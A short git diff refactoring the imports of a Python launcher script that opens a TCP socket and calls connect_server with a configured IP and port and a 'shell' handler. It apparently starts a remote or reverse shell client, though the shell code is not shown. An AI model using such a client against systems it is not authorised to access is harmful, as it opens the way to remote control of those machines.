@@ -1,7 +1,6 @@
 import socket
-from lib.client import connect_server, shell
-from lib import config
+from lib import client, config
 
 if __name__ == "__main__":
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect_server(sock, (config.IP, config.EOP_PORT), shell, 5)
+    client.connect_server(sock, (config.IP, config.EOP_PORT), client.shell, 5)
